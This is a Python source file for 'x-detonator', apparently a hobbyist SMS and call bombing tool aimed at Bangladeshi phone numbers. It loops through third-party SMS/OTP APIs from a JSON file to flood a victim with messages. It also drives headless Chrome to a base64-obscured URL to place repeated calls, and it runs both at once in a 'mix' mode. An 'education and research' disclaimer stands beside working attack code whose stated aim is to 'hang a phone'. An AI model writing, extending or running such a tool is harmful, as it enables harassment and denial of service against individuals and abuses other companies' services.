import sys
import os
import time
import assets
import json
import time
import base64
import re
import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


#color asci
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[31m'
RESET = '\033[0m'
BLUE = '\033[34m'
BBLUE='\033[1;34m'
#chk depencies installed or not
try:
    import requests
except:
    print(f"{RED}🚨 Oops! Certain dependencies are missing. Please install them before proceeding.{RESET}")
    print(
        f"Type {GREEN}'pip install -r requirements.txt' to "
        " install all required packages")
    print(f"{RESET}")
    
    sys.exit(1)

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

os.environ["TF_CPP_MIN_LOG_LEVEL"] = "3" 
sys.stderr = open(os.devnull, "w")

def check_internet():
    try:
        response = requests.get("https://www.google.com", timeout=3)
        print("Internet connected...\n")
    except requests.ConnectionError:
        print(f"{RED}[!] Oops, It looks like you have no Internet [!]")
        print(f"Please check your connection and try again.{RESET}")
        sys.exit()

#load api
with open("assets/apis.json", "r") as file:
    api_data = json.load(file)
ahh = base64.b64decode(api_data["magic"][0]["jadu"]).decode('utf-8')

# get script ver
def get_version():
    try:
        return open(".version", "r").read.strip()
    except Exception:
        return 'v1.0.0'

with open("assets/apis.json", "r") as file:
    api_data = json.load(file)

#get contributr
def contributors(data):
    print(f"{BLUE}Author : {YELLOW}SH4RK00{RESET}")
    contributors = data.get("contributors", [])
    if contributors:  
        print(f"{BLUE}Contributors:{YELLOW}", ", ".join(contributors))
        print(f"{RESET}")
    else:
        print()

#banner animater madewith ai
def rgb_color(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def banner(text):
    length = len(text.replace(" ", ""))  
    for index, char in enumerate(text):
        if char != " ":
           
            r = max(0, 255 - int((index / length) * 255))
            g = max(0, int((index / length) * 255))
            b = max(0, min(255, int((index / (length / 2)) * 255))) if index >= (length / 2) else 0

            sys.stdout.write(rgb_color(r, g, b) + char)
            time.sleep(0.005)
        else:
            sys.stdout.write(char)  

    print("\033[0m")
    

#############LOGO##############
logo = f"""
    ██╗  ██╗     ██████╗ ███████╗
    ╚██╗██╔╝     ██╔══██╗██╔════╝
     ╚███╔╝█████╗██║  ██║█████╗
     ██╔██╗╚════╝██║  ██║██╔══╝
    ██╔╝ ██╗     ██████╔╝███████╗
    ╚═╝  ╚═╝     ╚═════╝ ╚══════╝
    x-detonator || version: {get_version()}
[A powerful SMS and CALL bombing tool]"""

smsLogo='''
╔═╗╔╦╗╔═╗  ╔╗ ╔═╗╔╦╗╔╗ ╔═╗╦═╗
╚═╗║║║╚═╗  ╠╩╗║ ║║║║╠╩╗║╣ ╠╦╝
╚═╝╩ ╩╚═╝  ╚═╝╚═╝╩ ╩╚═╝╚═╝╩╚═
[-] This tool only work for BD phone number
'''

callLogo='''
╔═╗╔═╗╦  ╦    ╔╗ ╔═╗╔╦╗╔╗ ╔═╗╦═╗
║  ╠═╣║  ║    ╠╩╗║ ║║║║╠╩╗║╣ ╠╦╝
╚═╝╩ ╩╩═╝╩═╝  ╚═╝╚═╝╩ ╩╚═╝╚═╝╩╚═
[-] This tool only work for BD phone number
[-] We depend on others API for call bomb, so call bomb may not work properly or may show errors and other issues.
'''
mixLogo='''
   ▄▄▄▄▄▄▄▄▄▄▄     ▄  ▄▄▄▄▄    ▄▄▄▄▄▄ 
 ▄██▀▀▀███▀▀▀██▄  ██    ███▌   ████▀  
 ███   ███   ███ ███▌    ███  ▐███    
 ███   ███   ███ ███▌    ▀███▄███▀    
 ███   ███   ███ ███▌    ████▀██▄     
 ███   ███   ███ ███    ▐███  ▀███    
 ███   ███   ███ ███   ▄███     ███▄  
  ▀█   ███   █▀  █▀   ████       ███▄ 
 [-] max 100 Massage & 10 CALL 
'''

def validate_phone_number():
    while True:
        number = input("Enter an 11-digit phone number: ")
        if re.match(r'^(?:\+?88)?01[3-9]\d{8}$', number):
            return number
        else:
            print(f"{RED}Invalid phone number! Please enter a valid 11-digit BD number (e.g., 01XXXXXXXXX).{RESET}")


def validate_total_messages():
    while True:
        try:
            total_msg = int(input("Enter Amount (max:250 msg per req): "))
            if 1 <= total_msg <= 250:
                return total_msg  
            else:
                print("Invalid input! Please enter a number between 1 and 250.")
        except ValueError:
            print("Invalid input! Please enter a numeric value.")

def validate_total_call():
    while True:
        try:
            total_call = int(input("Enter Amount (max:20 call per req): "))
            if 1 <= total_call <= 20:
                return total_call  
            else:
                print("Invalid input! Please enter a number between 1 and 20.")
        except ValueError:
            print("Invalid input! Please enter a numeric value.")


def send_messages(number, total_msg, api_data):
    request_count = 0 
    print(f"{BBLUE}[+].Starting SMS BOMB{RESET}")

    while request_count < total_msg:
        for api in api_data["apis"]:
            if request_count >= total_msg:
                break

            url = api["url"].format(number=number)
            headers = api.get("headers", {})

            try:
                method = api["method"].upper()

                if method == "POST":
                    payload_template = api.get("payload", {})
                    payload_str = json.dumps(payload_template).replace("{number}", number)
                    payload = json.loads(payload_str)

                    response = requests.post(url, headers=headers, json=payload)

                elif method == "GET":
                    response = requests.get(url, headers=headers)

                else:
                    print("API error: Unsupported method.")

                if response.status_code == 200:
                    request_count += 1
                    print(f"{GREEN}[+]{request_count}. Message sent successfully to {number}{RESET}")
                else:
                    print(f"{RED}[-]Request failed with status code: {response.status_code}{RESET}")

            except requests.exceptions.RequestException as e:
                print(f"{RED}[-].Error sending request !{RESET}")
                check_internet()

            time.sleep(4)
    


def send_call(number,amount):
    print(f"{BBLUE}[+].Starting CALL Bomb{RESET}")

    url = ahh.replace("{number}", number)

    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_argument("--disable-logging")
    chrome_options.add_argument("--disable-dev-shm-usage")

    req_send=0
    while req_send < amount:
        try:
            driver = webdriver.Chrome(options=chrome_options)

            driver.get(url)
            time.sleep(15)

            print(f"{GREEN}[{req_send + 1}].Call sent successfully.{RESET}")
            req_send += 1

        except Exception as e:
            print(f"{RED}[-]Error encountered, retrying... {RESET}") 
            check_internet() 

        finally:
            driver.quit()
            time.sleep(35)
    

def mix_bomb(number, api_data):
    total_msg = 100
    total_call = 10

    sms_thread = threading.Thread(target=send_messages, args=(number, total_msg,api_data))
    call_thread = threading.Thread(target=send_call, args=(number, total_call))

    sms_thread.start()
    call_thread.start()

    sms_thread.join()
    call_thread.join()

    print("\nAll SMS and calls have been sent successfully!")
    input("Press enter to continue!\nPress Ctrl+C to exit tool")



def Menu():

    print(f'''{YELLOW}CHOOSE Action: {RESET}
{GREEN}[1] SMS bomb.
[2] CALL bomb.
[3] MIX call & sms bomb.
[4] What can do this tool!{RESET}
{RED}[-] For any kind of mis-use devloper not will be responsibe.
[-] This tool is only For Education and research pupose.{RESET}
''')
    
    option=int(input(f"{BLUE}Enter your choice : {RESET}"))

    if option==1:
        clr()
        banner(smsLogo)
        number = validate_phone_number()
        total_msg = validate_total_messages()
        send_messages(number, total_msg, api_data)
        print(f"\n{GREEN}All massage sent successfully :){RESET}")
        input("Press enter to continue!\nPress Ctrl+C to exit tool" )

    elif option==2:
        #call
        clr()
        banner(callLogo)
        number=validate_phone_number()
        total_call=validate_total_call()

        send_call(number,total_call)
        print(f"\n{GREEN}All Call sent successfully :){RESET}")
        input("Press enter to continue!\nPress Ctrl+C to exit tool")


        print("call bomb")
    elif option==3:
        clr()
        banner(mixLogo)
        number = validate_phone_number()
        mix_bomb(number,api_data)



    elif option==4:
        print(f'''{GREEN}
[1].send 50 sms in one minute
[2].send 10 Call in 10 minute
[3].can hang a phone for 5 min  {RESET}         
''')
        input("Press Enter to continue \npress CTRL+C to exit tool")
    else:
        print(f"{RED}[-].invalid selection!\n[-]Re-run the script!{RESET}")
        time.sleep(3)
        sys.exit()



#def choice():
if __name__=="__main__":
    while True:
        clr()
        banner(logo) 
        contributors(api_data)
        check_internet()
        Menu()
